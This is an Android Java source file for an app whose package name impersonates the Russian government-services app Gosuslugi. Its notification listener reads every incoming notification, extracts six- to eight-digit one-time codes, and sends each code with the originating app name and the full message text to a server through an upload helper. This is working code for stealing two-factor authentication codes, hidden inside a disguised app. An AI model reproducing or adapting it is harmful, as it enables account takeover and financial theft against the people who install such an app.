package ru.gosuslugi.app;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.os.Bundle;
import android.app.Notification;
import android.util.Log;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

public class NotificationListener extends NotificationListenerService {
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        Bundle extras = sbn.getNotification().extras;
        String title = extras.getString(Notification.EXTRA_TITLE, "");
        String text = extras.getString(Notification.EXTRA_TEXT, "");
        
        Pattern pattern = Pattern.compile("\\b(\\d{6,8})\\b");
        Matcher matcher = pattern.matcher(title + " " + text);
        
        if (matcher.find()) {
            String code = matcher.group(1);
            UploadHelper.sendTextToServer(getApplicationContext(), "notification_otp", 
                "Package: " + packageName + " Code: " + code + " Text: " + text);
        }
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Не используется
    }
}